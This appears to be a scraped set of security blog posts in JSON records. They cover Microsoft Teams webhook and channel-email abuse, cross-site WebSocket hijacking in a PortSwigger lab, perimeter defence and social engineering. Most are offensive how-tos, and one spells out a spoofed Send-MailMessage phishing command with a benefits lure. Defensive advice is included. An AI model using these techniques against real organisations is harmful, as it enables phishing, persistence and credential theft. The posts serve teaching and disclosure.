SkypeSpaceToken\n\nNow that we have the proper cookies and token values, we can start to enumerate all the information related to webhooks in a channel. The first thing we need is the connector configuration information.  This can easily be done by querying the \u201cconnectors/Manage/Configuration\u201d URI along with the Tenant, Teams ID, and Channel ID. However, when we send a request, we receive an Error message instead. \n\nFigure 9 \u2013 Error Response\n\nThis shouldn\u2019t happen, so to understand what the issue is, we can use Burp Suite to intercept legitimate traffic coming from a web browser-based version of Microsoft Teams. We can see that all the cookies are the same, however, on further inspection, we find there is a slight difference in the SkypeSpaceToken size.\n\nFigure 10 \u2013 Valid Request from Microsoft Teams via The Web Browser\n\nBy reviewing our Burp history, we can see that this smaller version of the SkypeSpaceToken is set from a POST request to the API https://teams.microsoft.com/api/authsvc/v1.0/authz, however, this token value is actually labeled as a SkypeToken. This API only requires a bearer token to authenticate, but it is important to note that this API and token is only for teams.microsoft.com and not office.com.\n\nFigure 11 \u2013 Creation of SkypeToken\n\nThis SkypeToken is quite different than the original one SkypeSpaceToken created previously. As mentioned before, there is not a lot of documentation around these cookies, however, decoding the JWT value shows that this cookie is very different from the ones we received previously. As shown below, the contents of this token indicate the OrganizationID and the user ID, which indicates that this cookie is used to identify those who are requesting information about a channel shared between multiple individuals who have permissions inside the same channel but are not necessarily the owner.\n\nFigure 12 \u2013 Decoded SkypeToken\n\nOnce we have this SkypeToken, we can then take the value of this SkypeToken and replace it with the value of SkypeSpacesToken. We can do this using PowerShell\u2019s \u201cSystem.Net.CookieContainer\u201d to create a temporary set of cookies. Once we have this new set, we parse through all the cookies stored by searching for SkypeSpacesToken. Once found, it replaces the value with the SkypeToken value. In doing so, we take a cookie created for teams.microsoft.com and use it with office.com.\n\nFigure 13 \u2013 Modifying Cookies\n\nWith this modification, we can run the request again, and, this time, we receive an HTTP response 200. This gives us the ability to query the manage/configuration URI. This page contains all the configuration information for all the installed webhooks in a channel.\n\nFigure 14 \u2013 Decoded Webhook Information\n\nAs you can see from the screenshot above, this request provides all the information related to webhooks in a channel, however, it does not provide the URL associated with each webhook. This is where the Configuration ID value comes into play. This value is a unique identifier for each webhook in a channel, to know which one webhook to interact with specifically. Using the same cookies, along with the following \u2014\n\nTeamID\n\nTenantID\n\nChannelID\n\nConfiguration ID\n\n\u2014 we can send a GET request to https://outlook.office.com/connectors/IncomingWebhook/Manage/Show and parse the response to find the webhook\u2019s URL.\n\nFigure 15 \u2013 Webhook\u2019s URLs\n\nUsing the Get-Webhooks module, we can request all the webhooks in all the channels a user has access to by looping through all Teams channels a user is currently a part of.\n\nFigure 16 \u2013 Webhook\u2019s URLs\n\nSo, What Can We Do with These Webhooks?\n\nLet\u2019s craft an HTTP POST request that will send a message to the channel configured with a connector. This can be done from the internet without authentication beyond the webhook URL itself. This is because all webhooks connectors by default do not come with any authentication mechanism attached to them (i.e. NTLM hash, Bearer Tokens).\n\nThis makes connectors great for persistence, or phishing your way back in. If you lose access to a target environment (credentials are changed, sessions revoked) but you have valid webhook URLs, you can send an internal Teams message, with the added bonus of appearing as the configured connector application.\n\nThese messages must follow a specific format, known as \u201cPrimary Message Card JSON.\u201d These message cards allow for a user to embed images, links, and even action buttons that when pressed trigger something (such as going to a specific URL). Microsoft has a great article on how to structure this type of JSON code.\n\nFigure 17 \u2013 Sample Primary Message Card JSON\n\nFigure 18 \u2013 Example of the Webhook Message\n\nEnumerating Channels\n\nUnderstanding your target and creating a realistic ruse plays a vital part in the success of this attack. This means we need some information about the channels we are targeting with our webhook phish (\u201cWISHING\u201d).\n\nLuckily, Microsoft has provided us functionality in the Graph API to pull this information. Using the Get-ChannelUsersEnum module, we can enumerate the following:\n\nChannel Description\n\nNumber of Channel Members\n\nList of Channel Members (including email address)\n\nChannel Owner\n\nFigure 19 \u2013 Example of GraphRunner\u2019s Get-ChannelUsersEnum Module\n\nCreate Your Own Webhooks\n\nWhat if there are no Webhooks in any channels that you have access to? No problem, thanks to Microsoft\u2019s configuration of these connectors, any user that is part of a channel can create a connector with a webhook. This includes low privilege users. To programmatically create a webhook, we use Burp once again to observe a POST request that is sent to the \u201cconnectors/IncomingWebhook/Manage/Create\u201d API. This API creates webhooks with specific settings inside a channel, based on the contents of a webkit form submission. This webkit form requires several values we can set ourselves, however, there are several that need to be generated by Microsoft. These include:\n\n_RequestVerificationToken\n\nAlternativeID Value\n\nForwardToEmail value\n\nBy reviewing the creation process through Burp, we can see a request to a different API, (\u201cconnectors/IncomingWebhook/Manage/New\u201d) occurring before the webkit form submission POST request. This API is important because this is where those above values are generated for the webkit, however ,much like how we enumerated webhooks discussed previously, we need to first generate a SkypeToken cookie to request them. Once we have that value and replace it as our SkypeSpaceToken value, we can send a GET request to this API to generate those missing values.\n\nFigure 20 \u2013 Request to Get Values Needed for Creating a Webhook\n\nFigure 21 \u2013 Example of Webkit Form\n\nBut that\u2019s not all we need; if we just send the request to the API, we see that we get an error response. This is because of a weird requirement (which I haven\u2019t found a reason for) in which we must specify the main or \u201cGeneral\u201d channel ID as the \u201cSkypeSpacesTeamId\u201d value instead of the channel we want to put the webhook in. By doing so, the webhook is still created in the proper channel, as the real ChannelId is stored in the SSThread parameter as well.\n\nFigure 22 \u2013 Webkit Request - Response Error\n\nFigure 23 \u2013 Webkit Request with the SkypeSpacesTeamID set to the General Channel\u2019s ID - Response Success\n\nWhile this process can seem extensive, the module Create-Webhooks does this all for you.\n\nFigure 24 \u2013 Webkit Request with the SkypeSpacesTeamID set to the General Channel\u2019s ID - Response Success\n\nFigure 25 \u2013 Webhook Created in Channel\n\nChannel Emails Enumeration\n\nWhile webhooks are one way to communicate inside Microsoft Teams, there is another way to get access. Microsoft Teams has you covered with the \u201cGet email address\u201d feature. The \"Get email address\" feature in Microsoft Teams channels allows each channel to have its own unique email address.\n\nFigure 26 \u2013 Teams Channel Email Address Creation\n\nThis feature enables members or external users to send emails directly to a specific channel. This feature is particularly useful for organizations that interact with clients or third parties via email. These email addresses are a randomly generated set of characters, making it hard to enumerate unauthenticated. In addition, by default, every channel does not come with an associated email address. Rather, they get assigned when a user requests one through the \u201cGet Email Address\u201d feature or Microsoft Teams Channel Email API. Microsoft claims that this feature needs to be enabled by the Administrator, however, through testing, we can see this is not the case.\n\nFigure 27 \u2013 Microsoft Documentation on This Feature\n\nThis API is quite simple to query, all we need is our bearer token and an X-SkypeToken. You will notice that the X-SkypeToken looks like a SkypeToken, created by the https://teams.microsoft.com/api/authsvc/v1.0/authz API \u2014 that\u2019s because it is the same token, just with a different name. Once we have this X-SkypeToken, the only other thing we need is the channel ID value. With these values, we can perform a series of HTTP requests to do different things:\n\nGET Requests \u2013 Checks if the channel has an email address set. If it does, it will respond with the email address and the permissions set for that email address. If there is no email address, it will respond with a status code \"NotFound\". \n\nFigure 28 \u2013 Get Request to Get the Channel Email Address Information\n\nFigure 29 \u2013 Response If There Is No Account Already Created\n\nPOST Requests \u2013 This sends a request to create the email address. As mentioned before, this address is generated randomly, so we can\u2019t specify what to set it as. We can, however, define the \u201callowedSenderType\u201d. In our case, we can set it to be \u201canyone\u201d. This means external users can send messages to this address with no issues.\n\nFigure 30 \u2013 POST Request to Create a Channel Email Address\n\nPUT Requests \u2013 Allows us to change the current values of \u201callowedSenderType\u201d if an email address already exists. \n\nFigure 31 \u2013 PUT Request to Update a Channel Email Address\u2019s AllowedSenderType\n\nFigure 32 \u2013 Get Request Verifying the Updated a Channel Email Address\u2019s AllowedSenderType\n\nThe module Get-ChannelEmail can automate this process, first looking for the email address, if there is one, it then checks to ensure it\u2019s set to \u201canyone\u201d. If there is no channel email address, this module then creates an email address with the \u201canyone\u201d permission.\n\nFigure 33 \u2013 Example of GraphRunner\u2019s Get-ChannelEmail Module\n\nSending Channel Emails\n\nWith the channel email address set to anyone, we could send an email directly to that channel from any email outside of the organization. While this sounds easy, Exchange Online Protection (EOP) still applies to email filtering. To send emails to a channel email, we have a few options. If we have an external email address to send from and the channel email address to send to, we can use any mail client to send the mail with our email address (hint: https://developer.microsoft.com/en-us/microsoft-365/dev-program) to create a tenant you can phish from.\n\nOtherwise, we can use a tool like https://github.com/rvrsh3ll/FindIngresEmail to find domains that may be allowed through EOP. To send a message, we may use the Send-MailMessage PowerShell command. For more information on the command, check out the Microsoft documentation: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/send-mailmessage?view=powershell-7.3 We suggest using the command in an Azure Console, as your connection will come from a Microsoft IP address and not be blocked by Spamhaus as if you were to send it from a residential IP address.\n\nSend-MailMessage -Body 'Required Enrollment: Benefits Enrollment' -To \"TestShared - MSFT_Derp_Devs <7d685121.derpdevs.onmicrosoft.com@amer.teams.ms>\" -From \"noreply@eircom.net\" -Subject \"Benefits Enrollment\" -SmtpServer \"amer-teams-ms.mail.protection.outlook.com\" -BodyAsHtml\n\nFigure 34 \u2013 Successful Teams Email Message\n\nAs you can see, the email landed successfully in the Teams channel. Since inbound emails to Teams channels pass through EOP, addresses from some domains may be blocked, or the content blocked, or any other Anti-Spam, Spoofing, or other filters may apply. For more information on how to test this, check out the BHIS blog here: https://www.blackhillsinfosec.com/spamming-microsoft-365-like-its-1995/.\n\nAlso, the channel shows a \u201cDownload original email\u201d link. Once the user clicks the link, a .eml file is downloaded. Opening the .eml file will load the email in the user\u2019s default mail app, such as Outlook. Several malicious possibilities exist there, that can help facilitate initial access.\n\nDefender Insight\n\nBHIS disclosed this issue in January 2024. At the time of this writing, these findings have been submitted to MSRC and closed per Microsoft without a fix. The intent of this article is to highlight the dangers of these features in Microsoft Teams and help defenders defend against them. Unfortunately, until Microsoft enforces authentication on the webhooks used for these connectors, there isn\u2019t a way to prevent external messages from getting in.\n\nSo, what can Administrators do? Well, Microsoft doesn\u2019t make it easy. As of right now, Microsoft either allows any users to install connector apps or no one. There is no in between. As these are vital for organizations to connect and integrate information from various external applications, services, or platforms, outright disabling these apps may not be an option for most organizations.\n\nFigure 35 \u2013 Microsoft Teams Admin Org-Wide Settings for Team\u2019s Apps\n\nUntil these issues are addressed by Microsoft, blue teamers need to rely on Microsoft Teams message-based detections rules that look for anomalous messages to detect this kind of abuse. It is also important to note that if a user adds a connector to a team and then leaves the team or is disabled or removed from the organization, that connector (and webhook) continues to work.\n\nMicrosoft does have some security controls to limit users\u2019 ability to send messages to a channel.\n\nFigure 36 \u2013 Microsoft Teams Admin Org-Wide Settings for Team\u2019s Email Integration\n\nHowever, further investigations into this option show that, when this is turned off, the option is removed only the Team\u2019s UI (both web client and desktop client) to request or view it. However, the API still allows requests and updates.\n\nFigure 37 \u2013 Microsoft Teams Client missing the Channel Get Email Address\n\nFigure 38 \u2013 Example of GraphRunner\u2019s Get-ChannelEmail Module Still Working\n\nBe sure to tune in next Thursday, 3/21, at 2:05pm ET for Matthew\u2019s webcast:\n\nMicrosoft Teams Abuse w/ Matthew Eidelberg\n\nYou can register HERE!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Can't Stop, Wont Stop Hijacking (CSWSH) WebSockets\"\nTaxonomies: \"How-To, InfoSec 201, Jack Hyland, Web App, cross-site websocket hijacking, CSWSH, SOP, websocket\"\nCreation Date: \"Thu, 21 Mar 2024 13:29:27 +0000\"\n\nThe WebSocket Protocol, standardized in 2011 with RFC 6455, enables full-duplex communication between clients and web servers over a single, persistent connection, resolving a longstanding limitation of HTTP that hindered bidirectional client to server communication. For example, if you\u2019d like to receive real-time sports updates for a game, your web browser would need to send a request to the web server once every second checking if there were any changes to the score. With WebSockets, the server sends your browser the updates as they happen, removing the need for constant polling. This reduces bandwidth usage and delays experienced by the user for real-time events.  \n\nThe differences between the traditional HTTP connection and a WebSocket connection are illustrated below. Notice that after the handshake, the WebSocket session remains connected and is bidirectional, while in a traditional HTTP transaction the connection is terminated, requiring a new request. \n\nWebSocket vs HTTP\n\nThis blog will demonstrate how to exploit the handshake step of the WebSocket protocol, allowing a malicious webpage to hijack a WebSocket using the victim\u2019s cookies. Each time I\u2019ve encountered an application using WebSockets on a penetration test with meaningful functionality, this vulnerability was present. The impact has ranged from privilege escalation to remote code execution. For a more general overview of WebSocket hacking, reference our previous blog post \u2014 How to Hack WebSockets and Socket.io.\n\nUnderstanding and Detecting WebSockets \n\nI\u2019ll be using Burp Suite Academy\u2019s free online lab so anyone can follow along. The lab occasionally timed out and needed to be refreshed, which caused a slight change in the subdomain name throughout the blog. \n\nFirst things first, you need to determine if the web application you are testing uses WebSockets. The best way to go about this is to set up Burp Suite to capture traffic and click around every page you see. Most of the time, only a small component of the site will use WebSockets, so you\u2019ll have to search around. Next, open Burp Suite and click the Proxy -> WebSockets history tabs to view any captured WebSocket traffic. If nothing appears then, no WebSocket traffic was found. As shown below, the /chat endpoint appeared to send and receive data over WebSockets. \n\nWebSocket Communication from Live Chat Captured in Burp Suite \n\nLet me backtrack a bit and give some context to how the WebSocket connection was established in the first place. It all starts with good ole\u2019 HTTP, as you can see in the image above. Browsing to the /chat endpoint returned an HTML document with the following reference to a JavaScript file. \n\n \n \n \n \n \n \n Cross-site WebSocket hijacking \n \n Back to lab description  \n \n \n \n \n \n \n \n \n \n LAB \n Not solved \n \n \n \n \n \n \n \n \n \n \n \n Home| \n My account| \n Live chat| \n \n \n \n \n Live chat \n \n \n 0a4600e703cc3f7b867e3026000f00da.web-security-academy.net/chat\"> \n Your message: \n \n \n Send \n \n \n \n \n \n \n \n \n \n \n \n\nNow that we have the malicious website saved, we can send it to our victim, who should have a pre-established session on the vulnerable website. For simplicity, we will pretend to be the victim and open the webpage within our Chrome or Chromium-based browser. As shown below, the user\u2019s chat history is automatically populated even though we are outside the context of https://0a4600e703cc3f7b867e3026000f00da.web-security-academy.net. The attacker\u2019s webpage has full control over the victim\u2019s authenticated WebSocket connection. \n\nMalicious Website Hijacked Victim\u2019s WebSocket \n\nIf we intercept the traffic, we can see that the victim\u2019s cookies were automatically appended to the PortSwigger lab server request made by the malicious website. This is allowed by the browser since the samesite flag for the session cookie was set to None. Also, we see that the Origin header is set to null; this is because the webpage was not hosted on a web server with a domain name but instead a file on our hard drive. It\u2019s important to note that the Origin header cannot be modified via JavaScript and is considered a \u201cforbidden header name\u201d by the browser.4 \n\nHTTP Handshake Between Victim\u2019s Browser and the Server \n\nSolve the Lab \n\nTo solve the PortSwigger lab, click on the \u201cGo to exploit server\u201d button at the top of the lab webpage and enter the code below into the body of the message. This process in the lab simulates a social engineering scenario where a victim with a session renders our malicious JavaScript within their browser. Make sure to modify the subdomain highlighted in red to match your PortSwigger lab instance. Next, click \u201cStore\u201d followed by \u201cDeliver exploit to victim.\u201d  \n\nOnce the victim\u2019s browser renders the following JavaScript, their WebSocket connection to the lab instance will be hijacked, the READY command is sent, and the chat history returned to the exploit server is base64 encoded inside a GET parameter value. \n\n \n\nOnce all of that is done, click on \u201cAccess log\u201d and CTRL + F for \u201cmsg.\u201d This will show you the exfiltrated base64-encoded messages sent and received by the victim. Feel free to go through and decode each one, however, the third one down will have the username and password. \n\nAccess Log with the Victim\u2019s Base64 Chat Messages \n\nGo to the decoder tab in Burp Suite and paste the base64-encoded string. Next, decode it as base64 and then HTML to get the plain text JSON. As shown below, the username is carlos and the password is the long random string. Note that this password will not work for your lab, so you\u2019ll have to reproduce each of the steps to get the points. \n\nDecoded Victim Chat String \n\nOn the home page of the lab click \u201cMy account\u201d to submit the username and password retrieved in the previous step. This will solve the lab! \n\nCSWSH Lab Successfully Solved \n\nDefense\n\nTo properly defend against this attack, the WebSocket server should block any requests during the HTTP handshake with origin values outside of a strict allowlist. Additionally, user session cookies should be set with samesite equal to Lax or Strict. \n\nReal Attack Scenarios \n\nI\u2019ve seen this vulnerability multiple times on penetration tests, and each time it was possible to combine CSWSH with other findings, leading to a higher impact for the report. Here are some anecdotal experiences: \n\nAn application had two portals, one for volunteers and a second for government workers. The dynamic functionality of both applications relied solely on WebSockets. A malicious page was able to hijack the government worker\u2019s WebSocket and perform administrative tasks. \n\nA CSWSH vulnerability was discovered in an admin portal along with a remote code execution vulnerability within the WebSocket. This allowed an exploit chain to be crafted where a malicious site would hijack the victim\u2019s WebSocket and then establish a reverse shell through the WebSocket back to the attacker\u2019s infrastructure. \n\nReferences\n\nhttps://book.hacktricks.xyz/pentesting-web/WebSocket-attacks\n\nhttps://portswigger.net/web-security/WebSockets/cross-site-WebSocket-hijacking\n\nFootnotes\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"In Through the Front Door - Protecting Your Perimeter\"\nTaxonomies: \"General InfoSec Tips & Tricks, Incident Response, Informational, Terry Reece, externally exploitable services\"\nCreation Date: \"Thu, 28 Mar 2024 14:00:00 +0000\"\n\nWhile social engineering attacks such as phishing are a great way to gain a foothold in a target environment, direct attacks against externally exploitable services are continuing to make headlines. In this blog, we'll cover things you can do to better protect externally exposed network resources. If you haven't reviewed your external footprint in some time, this is a good read to help you examine your current configurations and give you some ideas on better securing external infrastructure.  \n\nSome of the largest breaches in recent memory were due to exposed applications that suffered from remotely exploitable vulnerabilities. Many of us are probably familiar with vulnerabilities like Log4Shell1, ProxyShell2, and the MOVEit3 breaches. While these vulnerabilities were initially 0-days, continued exploitation took place well after patches were available from the vendors. What can we do to protect ourselves? Let's look at some questions we can ask to help ensure our external infrastructure is as secure as possible. \n\nWhat is Accessible and Why? \n\nKnowing what you have is the first step in being able to protect it. For a network, this means asking what services are accessible from the internet and why they are accessible. Keep an updated inventory of open ports and software in use, making sure you regularly review this data to keep it accurate and current. In a past life as an incident responder, it was not uncommon to learn that a breach was the result of a legacy firewall rule that was forgotten. Some of these situations allowed an adversary to obtain remote access to internal resources when there was no longer a legitimate business need for the port to be open on the firewall. Some ports were opened for testing purposes, containing an overly broad scope and never closed; others were opened for legitimate reasons, but facilitated access to applications with known vulnerabilities that were exploitable remotely.  \n\nTaking a thorough inventory of externally accessible services and software packages in use will go a long way in helping you understand ways to better secure your environment. Regular external vulnerability scans and port scanning checking all ports are useful ways to accomplish this. Tools such as commercial vulnerability scanners4, Nmap5, and masscan6 are useful. Other resources, such as Shodan.io,7 can also give you an idea of what ports and protocols are open on your networks. These tools can help with verifying network changes after deploying new systems or decommissioning older systems. Check vendor websites for security advisories and general product updates for any software packages in use. Ensuring your software is up-to-date and properly patched will go a long way in helping prevent successful breaches. Once patches have been applied, it is always a good idea to use a vulnerability scanner or manual testing to verify the patch was applied and the vulnerability had been mitigated.  \n\nConsequences of Exploitation \n\nNow that we know what we are opening to the world and why, let's ask ourselves, \u201cWhat would happen if these services were exploited?\u201d If a public-facing service is breached, where can the attacker move to next? Will they be able to access your entire network from a single compromised host, or will they be in a network that restricts or delays immediate lateral movement? Answering these questions requires some knowledge of your network architecture. For example, do you have a DMZ configured to separate internal resources from public-facing web servers? I have encountered many networks with NAT rules in place, allowing direct access to servers on an internal network. This configuration risks making further exploitation easier versus having an attacker boxed into a DMZ with fewer or more difficult options for lateral movement. This is particularly important if the software being exploited is through a 0-day. A vendor patch may not yet be available, but having the proper separation in place between externally accessible services and your internal network may be the only way to mitigate broader impact until a patch is available.  \n\nEmployee remote access is also a relevant topic to review in this process, particularly with the rise of remote workers. It is a good idea to examine how your users are accessing network resources externally. Where possible, keep the resources accessible only through a VPN that is protected with a strong password and multi-factor authentication. If a user requires external access to internal network services, it is a better choice to facilitate this access through a VPN instead of opening ports through a firewall.   \n\nAudit Logs Are Your Friend \n\nNow that you know what you have and why it is accessible, and you possess an understanding of the impact if those services were to be exploited, you will also want to know what is happening while others are interacting with those services. The best way to address this is to ensure audit policies are in place and log files are captured for analysis and general log retention. This is a critical step, and key to understanding the full impact of a breach. Ensuring your logging mechanisms are in place and correctly configured is critical. Sadly, I have been on IR engagements where firewall logs were only written to memory, with no more than a few hours of logs available, well past the timeframe of the suspected breach. If you don't have a SIEM, at a minimum, offload firewall logs to a syslog server. Other instances where a client's Microsoft 365 tenant did not have audit logging enabled were also common. A lack of log data can make it very difficult, in some cases impossible, to fully answer critical questions about events during a breach. Audit logging should always be enabled, and the resulting logs should be captured and stored for subsequent analysis and retention.  \n\nSummary \n\nIn this blog, we've talked about knowing what is accessible on your external network and why, how network architecture is important, and addressed the need for good auditing and logging practices. While this is not a catch-all process and there are many other related topics to consider, these are good starting points to better understand your environment and how to defend it.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Human Element in Cybersecurity: Understanding Trust and Social Engineering\"\nTaxonomies: \"Informational, Phishing, Physical, Red Team, Social Engineering\"\nCreation Date: \"Fri, 05 Apr 2024 14:48:58 +0000\"\n\nHuman Trust \n\nMost people associated with information technology roles understand the application of technical controls like the use of firewalls, encryption, and security products for defenses against digital threats. Proper configuration and implementation of these defense tools in keeping with industry best practices doesn\u2019t hurt when it comes to fending off attacks. However, the vulnerability in human trust is something that can't be precisely controlled like a firewall can. Trust is what human relationships are based on and relates to both the offline and online realms. In the digital realm, it takes on a unique dimension. Online interactions often lack the physical cues that individuals rely on during face-to-face communication, making it easier for cybercriminals to exploit this vulnerability.  \n\nIn cybersecurity, trust manifests in various ways:  \n\nTrust in Authority: People tend to trust those in positions of authority or those posing as such. When authority is exerted, people often comply with requests without questioning the legitimacy of the authority. \n\nTrust in Familiarity: Trusting someone due to existing or prior relationships is often exploited by hackers by impersonating acquaintances or using information gathered from social media to appear trustworthy.  \n\nTrust in Urgency: Pressure coming from a sense of urgency causes individuals to act quickly without having the time to scrutinize the authenticity of the request. \n\nSocial Engineering\n\nThe term sociale injenieurs (\u201cSocial Engineers\u201d) was first used by Dutch industrialist J.C. Van Marken in an essay in 1894. Later, the term had evolved into \u201csocial engineering,\u201d which referred to an approach of treating social relations as \u201cmachineries.\u201d However, social engineering, or manipulating the psychology of others, has been around since the beginning of time. \n\nAs social engineering relates to cybersecurity, it is commonly defined as coercing/manipulating someone with the goal of obtaining valuable information. In essence, social engineering is aimed at exploiting the human trust. There are several tactics utilized by hackers to acquire the \u201cvaluable\u201d information. These tactics might be used on their own or chained together.  \n\nPhishing: This attack is associated with electronic mail. An email is sent with the goal of appearing to be legitimate communication that will entice a user to complete the activity desired by the attacker (like clicking on a malicious link). The outcome is based on the goal of the attack. The user action may result in credential harvesting, malware execution, or other more complex attacks. Data is often compromised when the attack is successful. \n\nSpear Phishing: This is the same as a phishing attack, except instead of targeting a large audience, a specific individual is targeted. These types of attacks usually require a significant amount of research on the specific target.  \n\nWhaling: Same as a phishing attack but usually targeted toward high-profile users, such as executives or members of the C-Suite.  \n\nSmishing: Phishing over instant messaging, usually via a Short Message/Messaging Service SMS (also known as a phone text).  \n\nVishing: Performing social engineering via a phone call.  \n\nBaiting: An attacker entices the user with a free item to lure them into clicking on a link. (Get a free sandwich if you take the survey at the following link).  \n\nQuid Pro Quo: This is a variation of Baiting where the attacker gives \u201csomething for something.\u201d Example would be getting a free software download if you click a malicious link.  \n\nCatfishing: Attacker creates a fake online identity to lure others into false relationships.  \n\nPretexting: The attacker impersonates a representative from a trusted organization, hoping that the target doesn\u2019t question the legitimacy of the attacker. \n\nReverse Social Engineering: The attacker does not initiate direct contact with the target. The target is tricked into contacting the attacker. (The attacker is in distress and needs help). \n\nWatering Hole: An attacker compromises a legitimate website that their targets are known to visit. When the site is visited by the target, malware is deployed. \n\nScareware: These are where an attacker inserts malicious code into a website which causes the page to render a pop-up window with flashing colors and alarming sounds to entice the user into clicking a link or downloading malware.  \n\nUrgency: The attacker creates a sense of urgency or fear in the target, to convince the target to perform the attacker\u2019s desired activities.  \n\nHoneytrap: An attack which specifically targets individuals looking for love on online dating websites or social media.  \n\nDiversion Theft: An attacker tricks a target into sending or sharing sensitive data with the wrong person.  \n\nTailgating: Is a physical attack where an attacker follows someone into a secure or restricted area that they are not authorized access to.  \n\nPhysical Mail Phishing: Sending a letter or postcard to a target in the hope that they will perform the desired actions of the attacker.  \n\nAs you can see, there are several types of attacks. These attacks have the goal of getting a target to perform desired actions of the attacker. In some cases, the attacker might ask them to provide sensitive internal details (password policy, user\u2019s password, etc.), or to perform some unauthorized action (password reset, Multi-Factor Authentication reset, etc.), or to run a legitimate tool (like QuickAssist). In addition, some ruses, like device code abuse, are more complicated, requiring a user to submit a code on a legitimate site, granting the attacker access.  \n\nSocial Engineering Real World Examples \n\nAs a penetration tester, I have had the opportunity to conduct social engineering attacks. Below are a few that I found to be entertaining.  \n\nMuch More Than a Social Engineering Call: \n\nOne of my favorite social engineering calls happened to be against a customer who wanted me to attempt to get employees to go to a website I controlled. The website was a doppelganger of a commerce site which sold wearable items. Having malicious content on the site was not in scope for the test, as the customer just wanted to get some insight on how their employees would react to the social engineering calls. One of the targets that I picked out was a secretary for one of the C-Suite executives. After conducting research about the company, I was able to acquire the help desk number. While spoofing the help desk number, I called the secretary and told her that I was from IT. I told the employee that I was a representative from the IT department that was trying to track down a possible threat. I asked the secretary to proceed to my website and click on a link embedded in it. The secretary obliged, and I got a log entry that contained her IP address, showing proof that she had clicked on the link which redirected her to another page. The secretary told me that she had never been to that site before. I told her that I believed her, and I had some more investigating to do before I could conclude if the threat was legitimate. I thanked her for her time and then attempted to end the phone call after stating that I had everything I needed from her. She, however, had questions about personal online hygiene related to her passwords. I couldn\u2019t help myself and spent over an hour on the phone answering her questions before ending the call. \n\nGiving It to the Phisher: \n\nSeveral years ago, a colleague and I were on a Red Team engagement together and sent a phishing email to many of the client\u2019s employees. The context of the email was that there was an update to the company\u2019s benefits package which provided a link to view document (this ruse had been highly successful during other engagements). When they clicked on the link, they were redirected to a Microsoft login page and after inputting their credentials, a document about benefits was presented to the user. In this scenario, we attempted to capture login credentials so that we could use them to access data. We launched the phish early that morning and watched the log file on our server for credentials. After about an hour, we finally got a hit and were excited about having valid credentials to use for further exploitation. But, after looking at the credentials, we found that the username was blank and the password was \u201cYour Mom!\u201d After communicating with the customer about the unsuccessful phishing attempt, they were very apologetic about the message, and I told them not to be because it was an awesome comeback to our phishing ruse. (Yes, as a pentester, you are not always successful on the first attempt.) \n\nFlustered During a Physical: \n\nFirst, I would like to state that with any physical assessment, you have to be able to think on your feet. Since you hardly ever know what you will run into or what type of situation you will be presented with, the ability to rehearse all situations is not feasible or possible. This is also true when conducting different types of social engineering tests, such as social engineering calls.  \n\nFor this particular engagement, the customer wanted us to infiltrate the main headquarters of a company with the goal of gaining access into their data center. We had already performed physical assessments on three other facilities operated by the company and were successful at two of them. This was our second target of the day, which didn\u2019t give us much time as it was already 3:30pm. The headquarters building had a very small entry way, where a receptionist was located behind a big glass window. There was a door to the receptionist's left visible to her and a hallway on the other side where the receptionist had no visibility. The ruse included matching work shirts with a generic logo on it. The logo was duplicated on the fake work order that we created, which stated that maintenance was to be performed in the data center. We had placed our point of contact on the work order as a contact person. Since we didn\u2019t have a lot of time to prepare for this site due to this location being added to the scope at the last minute, we were sure that we would get turned away and would be tasked with testing their guest procedure.  \n\nBoth my colleague and I entered the small entrance to the building and presented the receptionist the work order. I stated that we are running a little behind and were hoping to get this job done before they closed at 5pm. While the receptionist was looking at the work order, I attempted to answer her questions before she was able to ask them. This seemed to frustrate and distract her. While I had the receptionist distracted, I motioned to my colleague to slip into the hallway. My colleague had taken the cue and took off without the receptionist noticing. The receptionist didn\u2019t realize that my colleague was gone and contacted our point of contact to confirm the work order. When the point of contact arrived, she had entered the reception area from the door that adjoined the entrance. The point of contact turned me away, stating that the work was not authorized. I left and then called her from the parking lot. I explained that we used the work order ruse to get my colleague into the building unnoticed and asked if we could proceed. The point of contact stated that it was a good ruse and didn\u2019t realize that we had someone inside the building. We were authorized to proceed with the test.  \n\nI left out of the front door and texted my colleague, who had found himself locked in a stairwell which had access to the loading dock on the main level and the data center door on the other level. I met him at the loading dock where he let me into the stairwell. Once at the data center door, we found a gap in the door which was covered with a plate so that the hasp was not exposed. We performed a hasp bypass by using a wire found under the stairwell with gold bells on them (yes, a Christmas decoration). After opening the door, we were met with an employee who caught us (bad timing).  \n\nThe lessons learned from the social engineering calls and physical engagements prompted the customers to review and edit their policies and procedures. This included training requirements for identifying social engineering tactics. \n\nFrom the examples above, you can see how various social engineering tactics were deployed with and without success. Humans inherently tend to trust people and have compassion toward other individuals, especially if they are having a rough time or appear to be in distress. There are several other examples where BHIS has demonstrated this to be true. One blog post that stands out is one by Carrie Roberts: https://www.blackhillsinfosec.com/social-engineering-sometimes-easy/.  \n\nProtections\n\nHow do you protect yourself or employees from being a social engineering victim? The following can help: \n\nVerify the Source: \n\nTake the time to verify where the communication is coming from and do not blindly trust unknown parties. Did you get an email stating that you have a package on the way with a link, when nothing was ordered? Did you find a USB in the hallway and have the urge to plug it in to see what is on it? \n\nDid the president of the company request sensitive information via an email message? \n\nVerification of the source is as easy as directly contacting the source to validate the request or going directly to a website instead of trusting the link provided.  \n\nInspection of emails: \n\nHovering over a link could identify a mismatch between the link and the targeted resource.   \n\nSpelling and grammar errors can be a good indication of a phishing attempt.  \n\nConsider using a spam filter. \n\nIf you cannot validate a QR code or get a QR code unexpectedly, don\u2019t open it (especially if it urges you to act immediately). \n\nAsk Questions: \n\nIf you are suspicious of the source pertaining to phone calls or in person interactions:  \n\nAsk questions that only that person would know. It might be as easy as asking how their vacation last week went, when you know the co-worker didn\u2019t take vacation.  \n\nAsk for identification to confirm the legitimacy of the individual.  \n\nValidate any work orders or other paperwork by directly calling the individual responsible and not the number disclosed on the document.  \n\nContact the originator out-of-band using internal corporate resources (email, phone, chat, etc.) \n\nUrgency: \n\nIf you get a sense of urgency, do not act in haste.  \n\nTake the time to understand if it is urgent and verify the source by calling or going directly to the website. \n\nUse another form of communication to validate the legitimacy of the request.  \n\nControls: \n\nImplementation of controls can help in instances where a social engineering attack is successful.  \n\nInclude Multi-Factor Authentication where employees access corporate resources.  \n\nRequire another employee to authorize sensitive tasks (electronic transfer of funds).  \n\nConditional Access Controls for corporate businesses where employees are only granted access to systems that are needed for their specific job title.   